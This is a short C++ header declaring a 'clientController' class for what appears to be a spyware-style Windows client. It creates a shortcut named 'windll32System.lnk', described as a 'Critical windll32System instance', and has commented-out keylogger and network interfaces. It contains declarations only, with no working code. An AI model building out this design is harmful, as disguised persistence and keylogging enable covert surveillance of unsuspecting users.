#ifndef CLIENT_H__
# define CLIENT_H__

# include "DLibrary.h"
# include "IInfoClient.h"
# include <Shlobj.h>
#include <shlwapi.h>
#include "windows.h"
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#pragma comment(lib, "shlwapi.lib")


# define SHORTCUT_NAME L"\\windll32System.lnk"
# define DESCR			"Critical windll32System instance"

class	clientController {

	DLManager	libraries;

	// Dictionaries
	Dictionary	sayHello;
	Dictionary	infoClient;
public:

	clientController(void) throw(DLibraryException);	// Initialise
	~clientController(void);			        // Destroy

	int		mainAction(int, char**);
	void		sayHelloAction(void);
	void		defineShortcut(void);
	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);
private:
	_I_InfoClient *ifinstance;
	/*IDataHandler *dhinstance;
	IKeylogger *klinstance;
	INetwork *netinstance; 
	IMSGQueue *_lqueue; */
};

#endif /* !CLIENT_H__ */
